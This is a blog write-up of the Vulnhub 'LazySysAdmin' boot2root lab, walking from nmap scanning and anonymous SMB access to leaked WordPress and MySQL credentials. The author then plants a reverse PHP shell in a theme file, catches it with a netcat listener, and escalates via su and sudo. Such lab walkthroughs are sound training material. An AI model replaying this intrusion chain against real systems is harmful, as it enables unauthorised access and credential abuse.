---
layout:     post
title:      "Vulnhub.com - LazySysAdmin: 1"
date:       2018-09-18 0:00:00
author:     "W3ndige"
permalink: /:title/
category: Vulnhub
---

Another day, another machine from Vulnhub. This time it's the one called **LazySysAdmin**.

{% highlight text %}
Name: LazySysAdmin 1.0

Author: Togie Mcdogie

Twitter: @TogieMcdogie

[Description]

Difficulty: Beginner - Intermediate

Boot2root created out of frustration from failing my first OSCP exam attempt.

Aimed at:

      > Teaching newcomers the basics of Linux enumeration
      > Myself, I suck with Linux and wanted to learn more about each service whilst creating a playground for others to learn

Special thanks to @RobertWinkel @dooktwit for hosting LazySysAdmin at Sectalks Brisbane BNE0x18

[Lore]

LazySysadmin - The story of a lonely and lazy sysadmin who cries himself to sleep

[Tested with]

    Virtualbox
    Vnware Workstation player

[Preffered setup]

Host only networking

[Hints]

    Enumeration is key
    Try Harder
    Look in front of you
    Tweet @togiemcdogie if you need more hints

[Other]

    What could you of done to speed up the enumeration process?
    Are there any obvious things that you missed, which you shouldnt of missed?
    Did you learn anything interesting?
    What have you added to your enumeration process to prevent you from wasting time?

[Checksum]

    Name: Lazysysadmin.zip
    Size: 501925265 bytes (478 MB)
    SHA256: DBAC88A2E76FD5A6693A2890030DD3BE0DC2C09F30B43A79BE8AB7A23B708EF5

{% endhighlight %}

* Author: [@TogieMcdogie ](https://twitter.com/@TogieMcdogie)
* Download: [https://www.vulnhub.com/entry/lazysysadmin-1,205/](https://www.vulnhub.com/entry/lazysysadmin-1,205/)

### Solution

First thing we have to do is to scan the machine for open services. 

{% highlight text %}
root@kali:~/vulnhub# nmap -sC -sV -A 10.0.0.25
Starting Nmap 7.70 ( https://nmap.org ) at 2018-09-17 14:10 EDT
Nmap scan report for 10.0.0.25
Host is up (0.00089s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 b5:38:66:0f:a1:ee:cd:41:69:3b:82:cf:ad:a1:f7:13 (DSA)
|   2048 58:5a:63:69:d0:da:dd:51:cc:c1:6e:00:fd:7e:61:d0 (RSA)
|   256 61:30:f3:55:1a:0d:de:c8:6a:59:5b:c9:9c:b4:92:04 (ECDSA)
|_  256 1f:65:c0:dd:15:e6:e4:21:f2:c1:9b:a3:b6:55:a0:45 (ED25519)
80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
|_http-generator: Silex v2.2.7
| http-robots.txt: 4 disallowed entries 
|_/old/ /test/ /TR2/ /Backnode_files/
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Backnode
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL (unauthorized)
6667/tcp open  irc         InspIRCd
| irc-info: 
|   server: Admin.local
|   users: 1
|   servers: 1
|   chans: 0
|   lusers: 1
|   lservers: 0
|   source ident: nmap
|   source host: 10.0.0.4
|_  error: Closing link: (nmap@10.0.0.4) [Client exited]
MAC Address: 08:00:27:1E:2E:64 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Hosts: LAZYSYSADMIN, Admin.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -3h20m00s, deviation: 5h46m24s, median: 0s
|_nbstat: NetBIOS name: LAZYSYSADMIN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: lazysysadmin
|   NetBIOS computer name: LAZYSYSADMIN\x00
|   Domain name: \x00
|   FQDN: lazysysadmin
|_  System time: 2018-09-18T04:11:05+10:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2018-09-17 14:11:05
|_  start_date: N/A

TRACEROUTE
HOP RTT     ADDRESS
1   0.89 ms 10.0.0.25

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.96 seconds
{% endhighlight %}

We can already see a bunch of open ports, but for now, we're going to focus on port `80`. 

{% highlight text %}
root@kali:~/vulnhub# curl 10.0.0.25/robots.txt
User-agent: *
Disallow: /old/
Disallow: /test/
Disallow: /TR2/
Disallow: /Backnode_files/
{% endhighlight %}

That's a bunch of directories, but only `/Backnode_files/` wasn't empty. From there we get the directory of called `wordpress`, to which we can navigate using the browser.  

![Wordpress directory](/img/lazysysadmin/wordpress_dir.png){:class="img-responsive center-block"}

But in the meantime, I stumbled upon something very interesting - `smb` share can be accessed by `anonymous` user. And there's a lot of goodies.

![Smb shares](/img/lazysysadmin/smb-shares.png){:class="img-responsive center-block"}

{% highlight text %}
root@kali:/run/user/0/gvfs/smb-share:server=10.0.0.25,share=share$# ls -la
total 38
drwx------ 1 root root     0 Aug 15  2017 .
dr-x------ 3 root root     0 Sep 17 13:53 ..
drwx------ 1 root root     0 Aug 14  2017 apache
drwx------ 1 root root     0 Aug 14  2017 Backnode_files
-rwx------ 1 root root   139 Aug 14  2017 deets.txt
-rwx------ 1 root root 36072 Aug  6  2017 index.html
-rwx------ 1 root root    20 Aug 15  2017 info.php
drwx------ 1 root root     0 Aug 14  2017 old
-rwx------ 1 root root    92 Aug 14  2017 robots.txt
drwx------ 1 root root     0 Aug 14  2017 test
-rwx------ 1 root root    79 Aug 14  2017 todolist.txt
drwx------ 1 root root     0 Sep 17 14:17 wordpress
drwx------ 1 root root     0 Aug 15  2017 wp
{% endhighlight %}

Firstly, let's view the `todolist.txt` and `deets.txt`.

{% highlight text %}
root@kali:/run/user/0/gvfs/smb-share:server=10.0.0.25,share=share$# cat todolist.txt
Prevent users from being able to view to web root using the local file browser

root@kali:/run/user/0/gvfs/smb-share:server=10.0.0.25,share=share$# cat deets.txt
CBF Remembering all these passwords.

Remember to remove this file and update your password after we push out the server.

Password 12345
{% endhighlight %}

It seems that we have the password, but to which account? Wordpress didn't work so I decided to move on with the `smb` share. Maybe we'll find something interesting in the `wordpress` directory?

{% highlight text %}
root@kali:/run/user/0/gvfs/smb-share:server=10.0.0.25,share=share$# cd wordpress/
root@kali:/run/user/0/gvfs/smb-share:server=10.0.0.25,share=share$/wordpress# cat wp-config.php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'Admin');

/** MySQL database password */
define('DB_PASSWORD', 'TogieMYSQL12345^^');
{% endhighlight %}

Great, we have the `MySQL` credentials. Unluckily, when we want to view the `wp-users` table, we are greeted with this error.

{% highlight text %}
Error

SQL query: DocumentationEdit Edit

SELECT `prefs`
FROM `phpmyadmin`.`pma_table_uiprefs`
WHERE `username` = 'Admin'
AND `db_name` = 'wordpress'
AND `table_name` = 'wp_users'

MySQL said: Documentation
#1142 - SELECT command denied to user 'Admin'@'localhost' for table 'pma_table_uiprefs'
{% endhighlight %}

Moving on with my attack, I decided to look at the login page in `Wordpress`. If the password to `MySQL`, maybe the `Wordpress` one will be similar? 

But nope, password to `Admin` account is the same as to `MySQL`. Don't reuse your passwords!

After logging in, I decided to paste the reverse php shell in `404.php` page of twentyfifteen theme.

![Reverse shell in theme](/img/lazysysadmin/themes-reverse.png){:class="img-responsive center-block"}

After that, change the essential info about your IP and port to use, and navigate to `10.0.0.25/wordpress/wp-content/themes/twentyfifteen/404.php`. 

In the meantime, run a listener. 

{% highlight text %}
root@kali:~# nc -lvp 1337
listening on [any] 1337 ...
10.0.0.25: inverse host lookup failed: Unknown host
connect to [10.0.0.4] from (UNKNOWN) [10.0.0.25] 57138
Linux LazySysAdmin 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux
 05:26:58 up  1:19,  0 users,  load average: 0.00, 0.05, 2.51
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
{% endhighlight %}

Great, we have the connection. From the directories, we know that there is only one user `togie`. 

{% highlight text %}
$ cd /home      
$ ls -la
total 12
drwxr-xr-x  3 root  root  4096 Aug 14  2017 .
drwxr-xr-x 22 root  root  4096 Aug 21  2017 ..
drwxr-xr-x  3 togie togie 4096 Aug 15  2017 togie
$ python -c 'import pty;pty.spawn("/bin/bash")'
{% endhighlight %}

Remember the password from the note earlier on? Maybe it will work for this account? 

{% highlight text %}
www-data@LazySysAdmin:/$ su togie
su togie
Password: 12345
togie@LazySysAdmin:/$
{% endhighlight %}

In addition, upon first things to find was that the `togie` user can run anything as `root`!

{% highlight text %}
togie@LazySysAdmin:/$ sudo  -l
sudo  -l
[sudo] password for togie: 12345

Matching Defaults entries for togie on LazySysAdmin:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User togie may run the following commands on LazySysAdmin:
    (ALL : ALL) ALL
togie@LazySysAdmin:/$ sudo su
sudo su
root@LazySysAdmin:/# cd /root
cd /root
root@LazySysAdmin:~# ls -la
ls -la
total 28
drwx------  3 root root 4096 Aug 15  2017 .
drwxr-xr-x 22 root root 4096 Aug 21  2017 ..
-rw-------  1 root root 1000 Aug 21  2017 .bash_history
-rw-r--r--  1 root root 3106 Feb 20  2014 .bashrc
drwx------  2 root root 4096 Aug 14  2017 .cache
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
-rw-r--r--  1 root root  347 Aug 21  2017 proof.txt
root@LazySysAdmin:~# cat proof.txt
cat proof.txt
WX6k7NJtA8gfk*w5J3&T@*Ga6!0o5UP89hMVEQ#PT9851


Well done :)

Hope you learn't a few things along the way.

Regards,

Togie Mcdogie




Enjoy some random strings

WX6k7NJtA8gfk*w5J3&T@*Ga6!0o5UP89hMVEQ#PT9851
2d2v#X6x9%D6!DDf4xC1ds6YdOEjug3otDmc1$#slTET7
pf%&1nRpaj^68ZeV2St9GkdoDkj48Fl$MI97Zt2nebt02
bhO!5Je65B6Z0bhZhQ3W64wL65wonnQ$@yw%Zhy0U19pu
{% endhighlight %}